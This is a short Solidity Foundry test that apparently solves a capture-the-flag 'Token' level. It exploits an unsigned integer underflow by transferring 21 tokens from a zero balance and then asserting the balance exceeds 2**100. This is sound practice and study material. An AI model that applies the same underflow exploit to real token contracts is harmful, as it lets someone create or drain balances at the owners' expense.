// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/level05.sol";

contract AttackerTokenTest is Test {
    function testLevel05() external {

        vm.prank(address(0x1));
        Token level05 = new Token(1000);

        console.log("Current balance is :", level05.balanceOf(address(this)));
        assertEq(level05.balanceOf(address(this)) , 0);

        level05.transfer(address(0x2), 21);

        console.log("New balance is :", level05.balanceOf(address(this)));
        assertGt(level05.balanceOf(address(this)) , 2**100);
    }
}
